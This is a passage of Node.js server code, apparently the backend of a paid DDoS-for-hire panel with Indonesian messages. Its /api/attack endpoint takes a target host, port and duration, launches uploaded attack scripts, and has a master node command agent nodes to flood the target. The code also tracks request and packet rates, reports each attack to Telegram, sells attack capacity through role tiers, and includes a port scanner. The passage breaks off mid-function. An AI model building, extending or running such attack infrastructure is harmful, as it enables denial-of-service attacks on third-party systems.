  setInterval(() => {
    cleanupOldHistory(7); 
  }, 60 * 60 * 1000);
}

async function fetchConfig(retries = 5, delay = 5000) {
  for (let attempt = 1; attempt <= retries; attempt++) {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 10000);

    try {
      const res = await fetch(CONFIG_URL, { signal: controller.signal });
      clearTimeout(timeoutId);

      if (!res.ok) throw new Error(`Status code ${res.status}`);

      const config = await res.json();

      SUPABASE_URL = config.SUPABASE_URL;
      SUPABASE_API_KEY = config.SUPABASE_API_KEY;
      MASTER_URL = config.MASTER_URL;
      TELEGRAM_BOT_TOKEN = config.TELEGRAM_BOT_TOKEN;
      TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;
      apiKey = config.apiKey || apiKey;
      AGENT_KEY = config.AGENT_KEY || AGENT_KEY;
      DEFAULT_PHOTO_URL = config.DEFAULT_PHOTO_URL || DEFAULT_PHOTO_URL;
      COOKIE_SECRET = config.COOKIE_SECRET || COOKIE_SECRET;

      const { createClient } = require('@supabase/supabase-js');
      supabase = createClient(SUPABASE_URL, SUPABASE_API_KEY);
      global.supabase = supabase;

      return;
    } catch (e) {
      clearTimeout(timeoutId);
      logActivity("FETCH_CONFIG_FAIL", { attempt, error: e.message });
      console.warn(`[CONFIG] Gagal ambil config (percobaan ${attempt}/${retries}): ${e.message}`);

      if (attempt < retries) {
        await new Promise(r => setTimeout(r, delay));
      } else {
        console.error('[CONFIG] Semua percobaan fetch gagal. Exit...');
      }
    }
  }
}
fetchConfig().then(() => {
  if (supabase) {
    loadPlugins();
  } else {
  }
});

setInterval(() => {
  fetchConfig();
}, 5 * 60 * 1000);

function startStatsMonitorLoop(interval = 1000) {
  setInterval(async () => {
    const pidMap = {};

    for (const [processId, proc] of Object.entries(activeProcesses)) {
      if (!proc?.ls?.pid) continue;

      pidMap[processId] = proc.ls.pid;
      stats[processId] ??= {
        rps: 0, pps: 0, bps: 0,
        _tempRps: 0, _tempPps: 0, _tempBps: 0
      };
    }

    const pidList = Object.values(pidMap);
    if (pidList.length === 0) return;

    try {
      const usage = await pidusage(pidList);

      for (const [processId, pid] of Object.entries(pidMap)) {
        const s = stats[processId];
        if (!s || !usage[pid]) continue;

        s.rps = s._tempRps;
        s.pps = s._tempPps;
        s.bps = Number((s._tempBps / 1_000_000).toFixed(2));
        s.cpuPercent = Number(usage[pid].cpu.toFixed(2));
        s.memoryMB = Math.round(usage[pid].memory / 1024 / 1024);
        s._tempRps = 0;
        s._tempPps = 0;
        s._tempBps = 0;
      }
    } catch (err) {
      logActivity("STATS_LOOP_ERROR", { error: err.message });
    }
  }, interval);
}

if (NODE_TYPE === 'master' || NODE_TYPE === 'agent') {
  startStatsMonitorLoop();
}

async function sendTelegramPhoto(caption, photoUrl = DEFAULT_PHOTO_URL) {
  if (NODE_TYPE === 'agent') return;
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;

  const maxRetries = 3; 
  let retries = 0;

  const sendRequest = async () => {
    try {
      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          photo: photoUrl,
          caption: caption,
          parse_mode: undefined
        }
      );
    } catch (err) {
      retries++;
      logActivity("SEND_TELEGRAM_PHOTO_ERR", {
        message: err.message,
        retries: retries,
        error: err
      });
      
      if (retries < maxRetries) {
        logActivity("SEND_TELEGRAM_PHOTO_RETRY", {
          retryAttempt: retries,
          message: err.message
        });
        setTimeout(sendRequest, 2000);  
      } else {
        sendTelegramAlert(`⚠️ Failed to send Telegram photo after ${maxRetries} retries.`);
      }
    }
  };

  await sendRequest();  
}

async function scanCommonPorts(ip, ports = [80, 443, 21, 22, 25, 53, 8080, 8443, 3306]) {
  const results = [];
  for (const port of ports) {
    const isOpen = await new Promise(resolve => {
      const socket = new net.Socket();
      socket.setTimeout(1500);
      socket.once('connect', () => {
        socket.destroy();
        resolve(true);
      });
      socket.once('timeout', () => {
        socket.destroy();
        resolve(false);
      });
      socket.once('error', () => resolve(false));
      socket.connect(port, ip);
    });
    if (isOpen) results.push({ port, status: 'open' });
  }
  return results;
}
// ==================== FILE UPLOAD SAFETY UTILITY ====================
function cleanupTempFile(filepath) {
  try { if (filepath && fs.existsSync(filepath)) fs.unlinkSync(filepath); } catch {}
}
// ======================= MULTER SETUP =======================
const storage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, uploadDir),
  filename: (_req, file, cb) => {
    if (!isValidFileName(file.originalname)) {
      return cb(new Error('Nama file tidak valid'));
    }
    cb(null, file.originalname);
  }
});
const upload = multer({
  storage,
  limits: { fileSize: MAX_FILE_SIZE },
  fileFilter: (_req, file, cb) => {
    const ext = path.extname(file.originalname).toLowerCase();
    const allowed = ['.js', '.sh'];
    if (!allowed.includes(ext)) {
      return cb(new Error('Hanya file .js atau .sh yang diizinkan'));
    }
    if (!isValidFileName(file.originalname)) {
      return cb(new Error('Nama file tidak valid'));
    }
    cb(null, true);
  }
});
// ======================= LOGIN USER =======================
async function authenticateUser(username, password) {
  const { data, error } = await supabase
    .from('users')
    .select('username, password, role')
    .eq('username', username)
    .single();

  if (error || !data) return null;

  const match = await bcrypt.compare(password, data.password);
  if (!match) return null;

  return data;
}
// ======================= EXPRESS SETUP =======================
app.use(express.json());
app.use(compression({
  filter: (req, res) => {
    const type = res.getHeader('Content-Type');
    if (type && type.includes('application/json')) return true;
    return false;
  }
}));
app.use(xss());
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization, X-API-Key");
  res.setHeader('Cache-Control', 'public, max-age=5');
  next();
});
app.use('/uploads', express.static(path.join(__dirname, 'web', 'uploads')));
app.use('/lib/method', express.static(uploadDir));
app.use(cookieParser());
app.use(async (req, res, next) => {
  const signed = req.cookies?.user;
  if (!signed) return next();

  const unsigned = cookieSignature.unsign(signed, COOKIE_SECRET);
  if (!unsigned) return next();

  const { data: user, error } = await supabase
    .from('users')
    .select('banned')
    .eq('username', unsigned)
    .single();

  if (error || !user) return next();

  const isBanned = user.banned === true;
  const isBannedPage = req.path === '/banned';

  if (isBanned && !isBannedPage) {
    return res.redirect('/banned');
  }

  if (!isBanned && isBannedPage) {
    return res.redirect('/');
  }

  next();
});

app.use(async (req, res, next) => {
  const signed = req.cookies?.user;
  if (!signed) return next();

  const username = cookieSignature.unsign(signed, COOKIE_SECRET);
  if (!username) return next();

  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'] || 'unknown';
  const now = Date.now();

  const onlineUsers = readFileJsonSafe(onlineUserPath, {});
  const prev = onlineUsers[username];
  const prevSeen = prev?.lastSeen || now;

  const ping = now - prevSeen > 10000 ? 999 : now - prevSeen;

  onlineUsers[username] = {
    ip,
    userAgent,
    path: req.path,
    lastSeen: now,
    ping
  };

  writeFileJsonSafe(onlineUserPath, onlineUsers);

  next();
});
// ======================= WEBSOCKET SETUP =======================
const wss = new WebSocket.Server({ server: httpServer });
global.wss = wss;
const clients = new Set();
wss.on('connection', (ws) => {
  ws.isAlive = true;
  clients.add(ws);
  ws.plugins = {}; 

  for (const pluginName in loadedPlugins) {
    if (loadedPlugins[pluginName].onConnect) {
      try {
        loadedPlugins[pluginName].onConnect(ws);
      } catch (e) {
        logActivity("PLUGIN_ONCONNECT_ERROR", {
          plugin: pluginName,
          error: e.message
        });
      }
    }
  }

  ws.on('pong', () => {
    ws.isAlive = true;
  });

  ws.on('close', () => {
    for (const pluginName in loadedPlugins) {
      if (loadedPlugins[pluginName].onDisconnect) {
        try {
          loadedPlugins[pluginName].onDisconnect(ws);
        } catch (e) {
          logActivity("PLUGIN_ONDISCONNECT_ERROR", {
            plugin: pluginName,
            error: e.message
          });
        }
      }
    }
    clients.delete(ws);
  });

  ws.on('error', (err) => {
    logActivity("WS_CLIENT_ERROR", { error: err.message });
    clients.delete(ws);
  });

  ws.on('message', (msg) => {
    try {
      const data = JSON.parse(msg);
      
      if (data.plugin && loadedPlugins[data.plugin]) {
        if (loadedPlugins[data.plugin].handleMessage) {
          try {
            loadedPlugins[data.plugin].handleMessage(ws, data);
          } catch (e) {
            logActivity("PLUGIN_HANDLE_MESSAGE_ERROR", {
              plugin: data.plugin,
              error: e.message
            });
          }
        }
        return;
      }
      
    } catch (e) {
      logActivity("WS_MESSAGE_PARSE_ERROR", { error: e.message });
      ws.close(1003, 'Format pesan tidak valid');
    }
  });
});

function broadcastWS(data) {
  const message = JSON.stringify(data);
  for (const client of clients) {
    if (client.readyState === WebSocket.OPEN) {
      try {
        client.send(message);
      } catch (e) {
        client.terminate();
        clients.delete(client);
      }
    }
  }
}

loadPlugins()
setInterval(() => {
  for (const ws of clients) {
    if (ws.isAlive === false) {
      ws.terminate();     
      clients.delete(ws);  
      continue;
    }

    ws.isAlive = false;
    try {
      ws.ping();           
    } catch (e) {
      ws.terminate();
      clients.delete(ws);
    }
  }
}, 30000);
// ======================= FUNGSI =======================
function spawnAttackScript(scriptName, args, processId) {
  const allowedExt = ['.js', '.sh'];
  const ext = path.extname(scriptName).toLowerCase();

  if (!allowedExt.includes(ext)) {
    const errMsg = `Ekstensi file tidak diizinkan: ${ext}`;
    logActivity("SPAWN_SCRIPT_INVALID_EXT", { processId, scriptName, ext });
    throw new Error(errMsg);
  }

  const scriptPath = path.resolve(uploadDir, scriptName);

  if (!scriptPath.startsWith(path.resolve(uploadDir))) {
    const errMsg = `Akses ke path tidak diizinkan: ${scriptPath}`;
    logActivity("SPAWN_SCRIPT_PATH_ESCAPE", { processId, scriptName, resolved: scriptPath });
    throw new Error(errMsg);
  }

  if (!fs.existsSync(scriptPath)) {
    const errMsg = `Script file "${scriptPath}" tidak ditemukan`;
    logActivity("SPAWN_SCRIPT_MISSING", { processId, scriptPath });
    throw new Error(errMsg);
  }

  let ls;
  if (ext === '.sh') {
    ls = spawn('sh', [scriptPath, ...args]);
  } else if (ext === '.js') {
    ls = sandboxCommandExecution(scriptPath, args);
  } else {
    const errMsg = `Ekstensi file tidak dikenali: ${ext}`;
    logActivity("SPAWN_SCRIPT_UNKNOWN_EXT", { processId, ext });
    throw new Error(errMsg);
  }

  activeProcesses[processId] = {
    ls, scriptName, args, status: 'running', lastResponse: Date.now(), restartCount: 0
  };
  
  stats[processId] = {
    rps: 0, pps: 0, bps: 0, _tempRps: 0, _tempPps: 0, _tempBps: 0
  };

  ls.stdout.on('data', (data) => {
  withProcessLock(processId, async () => {
    const output = data.toString();
    if (activeProcesses[processId]) {
      activeProcesses[processId].lastResponse = Date.now();
      activeProcesses[processId].status = 'running';
    }
    if (!stats[processId]) return;

    const lines = output.split(/\r?\n/);
    for (const line of lines) {
      const rpsMatches = [...line.matchAll(/RPS[:=]?\s*(\d+)/gi)];
      const ppsMatches = [...line.matchAll(/PPS[:=]?\s*(\d+)/gi)];
      const bpsMatches = [...line.matchAll(/BPS[:=]?\s*(\d+)/gi)];

      for (const m of rpsMatches) stats[processId]._tempRps += parseInt(m[1]);
      for (const m of ppsMatches) stats[processId]._tempPps += parseInt(m[1]);
      for (const m of bpsMatches) stats[processId]._tempBps += parseInt(m[1]);
    }
  });
});

  ls.stderr.on('data', (data) => {
  withProcessLock(processId, async () => {
    if (activeProcesses[processId]) {
      activeProcesses[processId].status = 'error';
    }
    delete stats[processId];
    delete activeProcesses[processId];
    logActivity("PROCESS_STDERR", { processId, error: data.toString() });
    await sendTelegramPhoto(
      `❗️ *Proses error*\n` +
      `*PID:* \`${ls.pid}\`\n` +
      `*Process ID:* \`${escapeTelegram(processId)}\`\n` +
      `*Error:*\n\`\`\`\n${escapeTelegram(data.toString())}\n\`\`\``
    );
  });
});

  ls.on('error', (err) => {
    if (activeProcesses[processId]) {
      activeProcesses[processId].status = 'crashed';
    }
    if (stats[processId]?._interval) {
      delete stats[processId];
    }
    delete activeProcesses[processId];
    logActivity("PROCESS_CRASHED", { processId, error: err.toString() });
    sendTelegramPhoto(
      `💥 *Proses crash*\n` +
      `*PID:* \`${ls?.pid || 'unknown'}\`\n` +
      `*Process ID:* \`${escapeTelegram(processId)}\`\n` +
      `*Error:*\n\`\`\`\n${escapeTelegram(err.toString())}\n\`\`\``
    );
  });

  ls.on('close', (code) => {
  withProcessLock(processId, async () => {
    let status = 'stopped';
    if (code === 0) {
      status = 'success';
    } else if (activeProcesses[processId]?.status === 'crashed' || code === 1) {
      status = 'failed';
    } else if (code === 'stopped_by_user') {
      status = 'stopped';
    }

    delete stats[processId];
    delete activeProcesses[processId];

    updateAttackHistory(processId, {
      endTime: new Date().toISOString(),
      status,
      exitCode: code
    });

    logActivity("PROCESS_EXITED", { processId, exitCode: code, finalStatus: status });

    if (NODE_TYPE === 'master') {
      broadcastWS({ type: "attack_stopped", processId, exitCode: code, status });
    }

    await sendTelegramPhoto(
      `🛑 *Proses selesai*\n` +
      `*PID:* \`${ls.pid}\`\n` +
      `*Process ID:* \`${escapeTelegram(processId)}\`\n` +
      `*Exit code:* \`${code}\`\n` +
      `*Status:* \`${status}\``
    );
  });
});

  return { processId, ls, scriptName, args };
}
// ========================= ENDPOINT: DASHBOARD & UTILITY =========================
app.get('/', disableIfAgent(), (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'index.html'));
});
app.get('/login', disableIfAgent(), (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'login.html'));
});
app.get('/register', disableIfAgent(), (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'register.html'));
});
app.get('/usermanager', disableIfAgent(), requireLogin, requireAdmin, (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'usermanager.html'));
});
app.get('/adminpanel', disableIfAgent(), requireLogin, requireAdmin, async (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'adminpanel.html'));
});
app.get('/dashboard', disableIfAgent(), requireLogin, async (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'dashboard.html'));
});
app.get('/profile', disableIfAgent(), requireLogin, (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'profile.html'));
});
app.get('/banned', disableIfAgent(), (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'banned.html'));
});
app.get('/admin-only', disableIfAgent(), requireLogin, (req, res) => {
  res.sendFile(path.join(__dirname, 'web', 'admin-only.html'));
});
 //========= ENDPOINT =========
app.post('/api/broadcast-news', disableIfAgent(), requireLogin, requireAdmin, async (req, res) => {
  const { news } = req.body;
  if (!news) return res.status(400).json({ error: 'Konten berita diperlukan' });

  saveNews(news);

  broadcastWS({
    type: 'broadcast_news',
    news: news
  });

  res.json({ message: 'Berita berhasil disiarkan' });
});

app.get('/api/news', disableIfAgent(), requireLogin, (req, res) => {
  const newsData = readFileJsonSafe(newsPath, []);
  res.json(newsData);
});

app.get('/api/me', disableIfAgent(), requireLogin, async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('users')
      .select('username, role, photo_url, expired_at, custom_concurrent, custom_time')
      .eq('username', req.user.username)
      .single();

    if (error) return res.status(500).json({ error: error.message });
    const cooldownMap = {
      basic: 120,
      vip: 80,
      vvip: 65,
      mvp: 45,
      admin: 0
    };

    const role = data.role || 'basic';
    const cooldown = cooldownMap[role] ?? 60;

    res.json({
      ...data,
      cooldown,
      expired_at: data.expired_at || null,
      custom_concurrent: data.custom_concurrent ?? null,
      custom_time: data.custom_time ?? null
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await authenticateUser(username, password);
  if (!user) {
    return res.status(401).json({ error: 'Username atau password salah' });
  }
  const isProduction = process.env.NODE_ENV === 'production';
  const signedUser = cookieSignature.sign(username, COOKIE_SECRET);
  res.cookie('user', signedUser, {
    httpOnly: true,
    maxAge: 3600000,
    secure: isProduction,
    sameSite: isProduction ? 'Strict' : 'Lax'
  });
  res.json({
    message: 'Login berhasil',
    role: user.role,
    username: user.username
  });
});

app.post('/api/logout', disableIfAgent(), requireLogin, (req, res) => {
  res.clearCookie('user');
  res.json({ message: 'Logout berhasil' });
});

const profileStorage = multer.diskStorage({
  destination: (_req, _file, cb) => cb(null, path.join(__dirname, 'web', 'uploads')),
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname);
    const safeName = req.user.username.replace(/[^a-z0-9]/gi, '_');
    cb(null, safeName + ext);
  }
});
const profileUpload = multer({ storage: profileStorage });

app.post('/api/profile/update', disableIfAgent(), requireLogin, profileUpload.single('photo'), async (req, res) => {
  const { username, password } = req.body;
  const photo_url = req.file ? `/uploads/${req.file.filename}` : undefined;

  const updates = {};
  if (username && username !== req.user.username) updates.username = username;
  if (password && password.length >= 6) updates.password = await bcrypt.hash(password, 10);
  if (photo_url) updates.photo_url = photo_url;

  if (Object.keys(updates).length === 0) return res.status(400).json({ error: 'Tidak ada perubahan' });
  if (updates.username) {
  const { data: existing } = await supabase
    .from('users')
    .select('username')
    .eq('username', updates.username)
    .neq('username', req.user.username)
    .single();

  if (existing) return res.status(409).json({ error: 'Username sudah dipakai' });
}

  const { error } = await supabase
    .from('users')
    .update(updates)
    .eq('username', req.user.username);

  if (error) return res.status(500).json({ error: error.message });

  res.json({ message: 'Profil berhasil diperbarui', photo_url });
});

app.post('/api/register', disableIfAgent(), async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password || username.length < 3 || password.length < 6) {
    return res.status(400).json({ error: 'Username minimal 3 karakter & password minimal 6 karakter' });
  }
  if (!/^[a-zA-Z0-9_\-\.]+$/.test(username)) {
    return res.status(400).json({ error: 'Username hanya boleh huruf, angka, underscore, dash, titik.' });
  }

  try {
    const hashedPassword = await bcrypt.hash(password, 10);
    const { error: insertError } = await supabase
      .from('users')
      .insert([
        {
          username,
          password: hashedPassword,
          role: 'basic',
          custom_concurrent: 2,
          custom_time: 60      
        }
      ]);

    if (insertError) {
      if (insertError.message && insertError.message.toLowerCase().includes('duplicate')) {
        return res.status(409).json({ error: 'Username sudah digunakan' });
      }
      return res.status(500).json({ error: 'Gagal mendaftar: ' + insertError.message });
    }
    res.json({ message: 'Registrasi berhasil' });
  } catch (e) {
    res.status(500).json({ error: 'Kesalahan server: ' + e.message });
  }
});

app.get('/api/apikey', disableIfAgent(), requireLogin, (req, res) => {
  res.json({
    apiKey,
    username: req.user.username
  });
});

app.get('/api/users', disableIfAgent(), requireLogin, requireAdmin, async (req, res) => {
  const { data, error } = await supabase
    .from('users')
    .select('username, role, banned, expired_at, custom_concurrent, custom_time');

  if (error) return res.status(500).json({ error: error.message });
  res.json(data);
});

app.get('/api/users/online', disableIfAgent(), requireLogin, requireAdmin, (req, res) => {
  const data = readFileJsonSafe(onlineUserPath, {});
  const now = Date.now();
  const threshold = 5 * 60 * 1000;

  const online = Object.entries(data)
    .filter(([_, info]) => now - info.lastSeen < threshold)
    .map(([username, info]) => ({
      username,
      ip: info.ip,
      userAgent: info.userAgent,
      path: info.path,
      lastSeen: new Date(info.lastSeen).toLocaleString(),
      ping: info.ping || 0
    }));

  res.json({ online });
});
setInterval(() => {
  const users = readFileJsonSafe(onlineUserPath, {});
  const now = Date.now();
  const newUsers = {};

  for (const [u, info] of Object.entries(users)) {
    if (now - info.lastSeen < 2 * 60 * 1000) {
      newUsers[u] = info;
    }
  }
  writeFileJsonSafe(onlineUserPath, newUsers);
}, 5 * 60 * 1000);

app.post('/api/users', disableIfAgent(), requireLogin, requireAdmin, express.json(), async (req, res) => {
  const { username, password, role } = req.body;

  if (!username || !password || !role) {
    return res.status(400).json({ error: 'Username, password, dan role wajib diisi' });
  }

  const { data: existing } = await supabase
    .from('users')
    .select('username')
    .eq('username', username)
    .single();

  if (existing) return res.status(409).json({ error: 'Username sudah ada' });

  const hash = await bcrypt.hash(password, 10);

  const { error } = await supabase
    .from('users')
    .insert([{ username, password: hash, role }]);

  if (error) return res.status(500).json({ error: error.message });
  res.json({ message: 'User ditambahkan' });
});

app.delete('/api/users/:username', disableIfAgent(), requireLogin, requireAdmin, async (req, res) => {
  const username = req.params.username;
  if (!username) return res.status(400).json({ error: 'Username tidak valid' });

  const { error } = await supabase
    .from('users')
    .delete()
    .eq('username', username);

  if (error) return res.status(500).json({ error: error.message });
  res.json({ message: 'User dihapus' });
});

app.put('/api/users/:username/role', disableIfAgent(), requireLogin, requireAdmin, express.json(), async (req, res) => {
  const username = req.params.username;
  const { role } = req.body;
  if (!role) return res.status(400).json({ error: 'Role wajib diisi' });

  const { error } = await supabase
    .from('users')
    .update({ role })
    .eq('username', username);

  if (error) return res.status(500).json({ error: error.message });
  res.json({ message: 'Role diperbarui' });
});

app.put('/api/users/:username/password', disableIfAgent(), requireLogin, requireAdmin, express.json(), async (req, res) => {
  const username = req.params.username;
  const { password } = req.body;

  if (!password || password.length < 6) {
    return res.status(400).json({ error: 'Password minimal 6 karakter' });
  }

  const hash = await bcrypt.hash(password, 10);

  const { error } = await supabase
    .from('users')
    .update({ password: hash })
    .eq('username', username);

  if (error) return res.status(500).json({ error: error.message });
  res.json({ message: 'Password diperbarui' });
});

app.get('/setting/toggle', disableIfAgent(), validateKeyAndLogin, (req, res) => {
  const { target, value } = req.query;

  if (target === 'autoDeleteAgent') {
    AUTO_DELETE_AGENT = value === 'true';
    return res.json({ success: true, AUTO_DELETE_AGENT });
  }

  if (target === 'masterAttackSelf') {
    MASTER_ATTACK_SELF = value === 'true';
    return res.json({ success: true, MASTER_ATTACK_SELF });
  }

  return res.status(400).json({ error: 'Invalid setting target' });
});

app.get('/setting/status', disableIfAgent(), validateKeyAndLogin, (req, res) => {
  res.json({ AUTO_DELETE_AGENT, MASTER_ATTACK_SELF });
});

app.get('/api/config/dangerous_keywords', disableIfAgent(), requireLogin, requireAdmin, (req, res) => {
  const config = readConfig();
  res.json(config.dangerous_keywords || []);
});

app.post('/api/config/dangerous_keywords', disableIfAgent(), requireLogin, requireAdmin, (req, res) => {
  const { keywords } = req.body;
  if (!Array.isArray(keywords)) return res.status(400).json({ error: 'Invalid input' });

  const config = readConfig();
  config.dangerous_keywords = keywords;
  writeConfig(config);
  DANGEROUS_KEYWORDS = keywords;
  res.json({ success: true, updated: keywords.length });
});

app.put('/api/users/:username/settings', disableIfAgent(), requireLogin, requireAdmin, express.json(), async (req, res) => {
  const { username } = req.params;
  const { banned, expired_at, custom_concurrent, custom_time } = req.body;

  const { error } = await supabase
    .from('users')
    .update({
      banned: banned === true,
      expired_at: expired_at ? new Date(expired_at).toISOString() : null,
      custom_concurrent: isNaN(custom_concurrent) ? null : custom_concurrent,
      custom_time: isNaN(custom_time) ? null : custom_time
    })
    .eq('username', username);

  if (error) return res.status(500).json({ error: error.message });
  res.json({ message: 'Pengaturan user diperbarui' });
});

app.get('/api/blacklist-hosts', disableIfAgent(), validateKeyAndLogin, (req, res) => {
  const config = readConfig();
  res.json({ list: config.blacklist_hosts || [] });
});

app.post('/api/blacklist-hosts', disableIfAgent(), validateKeyAndLogin, express.json(), (req, res) => {
  const { list } = req.body;
  if (!Array.isArray(list)) return res.status(400).json({ error: 'Format tidak valid' });

  const config = readConfig();
  config.blacklist_hosts = list;
  writeConfig(config);
  logActivity("BLACKLIST_HOSTS_UPDATED", { total: list.length });
  res.json({ success: true });
});

app.get('/api/attack', requireRoleLimit(), validateApiKey, validateBlacklist, async (req, res) => {
  try {
    const { key, host, port: targetPort, time, method, user, concurrent } = req.query;
    if (!host || !targetPort || !time || !method) return res.status(400).send('Parameter tidak lengkap');

    const portNum = parseInt(targetPort, 10);
    const timeNum = parseInt(time, 10);
    if (isNaN(portNum) || portNum < 1 || portNum > 65535) {
      return res.status(400).send('Port harus berupa angka 1-65535');
    }
    if (isNaN(timeNum) || timeNum <= 0) {
      return res.status(400).send('Durasi waktu harus berupa angka positif');
    }

    const methods = readMethods();
    const selected = methods[method];
    if (!selected) return res.status(400).send('Metode tidak valid');

    const args = selected.args.map(arg => {
      if (typeof arg === "string" && arg.startsWith("<") && arg.endsWith(">")) {
        switch (arg) {
          case "<host>": return host;
          case "<port>": return targetPort;
          case "<time>": return time;
          default: return arg;
        }
      }
      return arg;
    });

    const processId = `${method}-${Date.now()}`;
    let proc = null;

    if (NODE_TYPE === 'master' && (!AGENT_KEY || AGENT_KEY.length < 5)) {
      logActivity("ERROR_ATTACK_AGENTKEY_INVALID", { AGENT_KEY });
      return res.status(500).json({
        error: 'AGENT_KEY belum dikonfigurasi dengan benar di master (panjang < 5 karakter atau kosong).'
      });
    }

    const shouldExecute = (NODE_TYPE === 'agent') || (NODE_TYPE === 'master' && MASTER_ATTACK_SELF);

if (shouldExecute) {
  proc = spawnAttackScript(selected.script, args, processId);

  logActivity("START_ATTACK", { processId, host, targetPort, time, method, pid: proc.ls.pid, args });
}

await sendTelegramPhoto(
  `🔥 *Serangan dimulai (${NODE_TYPE})*\n` +
  `🛡️ *Host:* \`${escapeTelegram(host)}\`\n` +
  `🎯 *Port:* \`${escapeTelegram(targetPort)}\`\`\n` +
  `⏱️ *Durasi:* \`${escapeTelegram(time + 's')}\`\n` +
  `⚔️ *Metode:* \`${escapeTelegram(method)}\`\n` +
  `🆔 *Process ID:* \`${escapeTelegram(processId)}\`\n` +
  `🔢 *PID:* \`${proc?.ls?.pid || 'N/A'}\``
);

    logAttackHistory({
  processId,
  startTime: new Date().toISOString(),
  endTime: null,
  host,
  port: targetPort,
  method,
  duration: time,
  concurrent,
  status: 'running',
  who: user || 'unknown',
  masterOrAgent: NODE_TYPE
});

    if (NODE_TYPE === 'master') {
  broadcastWS({ type: "attack_started", processId, host, port: targetPort, method, time });
}

let agentResults = [];
    if (NODE_TYPE === 'master') {
      loadAgents();

      const requestedConcurrent = parseInt(concurrent, 10);
      let activeAgents = [];

if (!isNaN(requestedConcurrent) && requestedConcurrent > 0) {
  activeAgents = getBestAgents(requestedConcurrent);
} else {
  activeAgents = getBestAgents(AGENT_LIST.length);
}

if (activeAgents.length < requestedConcurrent) {
  logActivity("WARNING_AGENT_LIMIT", {
    requested: requestedConcurrent,
    available: activeAgents.length
  });
}

  const limit = pLimit(5);
  agentResults = await Promise.all(
    activeAgents.map(agent => limit(() =>
      axios.get(`${agent.url}/api/attack`, {
        params: { key: AGENT_KEY, host, port: targetPort, time, method },
        timeout: 13000
      })
      .then(r => {
        if (r.data?.processId) {
          agentProcessMap[r.data.processId] = {
            agentName: agent.name,
            agentUrl: agent.url
          };
          activeProcesses[r.data.processId] = {
            agentName: agent.name,
            agentUrl: agent.url,
            isAgent: true,
          };
        }
        return { agent, status: 'success', data: r.data };
      })
      .catch(e => ({ agent, status: 'failed', error: e.message }))
    ))
  );

  if (!shouldExecute && NODE_TYPE === 'master') {
    const successCount = agentResults.filter(r => r.status === 'success').length;
    const failCount = agentResults.filter(r => r.status === 'failed').length;

    let finalStatus = 'running';
    if (successCount > 0 && failCount === 0) {
      finalStatus = 'success';
    } else if (successCount === 0 && failCount > 0) {
      finalStatus = 'failed';
    } else if (successCount > 0 && failCount > 0) {
      finalStatus = 'partial';
    }

    updateAttackHistory(processId, {
      endTime: new Date().toISOString(),
      status: finalStatus
    });

    broadcastWS({ type: "attack_completed", processId, status: finalStatus });

    await sendTelegramPhoto(
      `✅ *Serangan selesai (agent-only)*\n` +
      `🆔 *Process ID:* \`${escapeTelegram(processId)}\`\n` +
      `📊 *Status:* \`${finalStatus}\`\n` +
      `📦 *Berhasil:* ${successCount}, ❌ Gagal: ${failCount}`
    );
  }
  
  logActivity("MASTER_ATTACK", {
    host, targetPort, time, method,
    totalAgents: AGENT_LIST.length,
    usedAgents: activeAgents.length,
    agentResults
  });
}

    return res.json({
      message: `Serangan dimulai (${NODE_TYPE})`,
      processId,
      pid: proc?.ls?.pid || null,
      agents: agentResults
    });
  } catch (err) {
    logActivity("ERROR_ATTACK", { error: err.toString() });
    res.status(500).send('Kesalahan Internal Server');
  }
});

app.get('/api/attack/stop', validateApiKey, async (req, res) => {
  try {
    const { key } = req.query;
    const pids = Object.keys(activeProcesses);
    pids.forEach(pid => {
      if (activeProcesses[pid]?.ls) activeProcesses[pid].ls.kill('SIGINT');
      clearInterval(stats[pid]?._interval);
      delete stats[pid];
      delete activeProcesses[pid];
      logActivity("STOP_PROCESS", { processId: pid, isMaster: true });
      broadcastWS({ type: "attack_stopped", processId: pid, exitCode: 'stopped_by_user' });
      updateAttackHistory(pid, {
        endTime: new Date().toISOString(),
        status: 'stopped',
        exitCode: 'stopped_by_user'
      });
    });
    loadAgents();
    const limit = pLimit(5);
const agentResults = await Promise.all(
  AGENT_LIST.map(agent => limit(() =>
    axios.get(`${agent.url}/api/attack/stop`, {
      params: { key: AGENT_KEY },
      timeout: 30000
    })
    .then(r => ({ agent, status: 'success', data: r.data }))
    .catch(e => ({ agent, status: 'failed', error: e.message }))
  ))
);
    logActivity("MASTER_STOP", { agentResults });
    await sendTelegramPhoto(
      `🛑 *STOP broadcast ke agents & master:*\n` +
      agentResults.map(r => `• \`${escapeTelegram(r.agent.name || r.agent.url)}\`: *${r.status}*`).join('\n')
    );
    if (NODE_TYPE === 'master') {
  broadcastWS({ type: "all_stopped" });
}
    return res.json({ message: 'Semua proses di master & agents dihentikan', results: agentResults });
  } catch (err) {
    logActivity("ERROR_STOP", { error: err.toString() });
    res.status(500).send('Kesalahan Internal Server');
  }
});

app.post('/api/attack/stop-by-id', validateApiKey, async (req, res) => {
  const { processId } = req.body;

  try {
    if (!processId) {
      return res.status(400).json({ error: 'processId tidak disediakan' });
    }

    // === Jika NODE_TYPE agent ===
    if (NODE_TYPE === 'agent') {
      const proc = activeProcesses[processId];
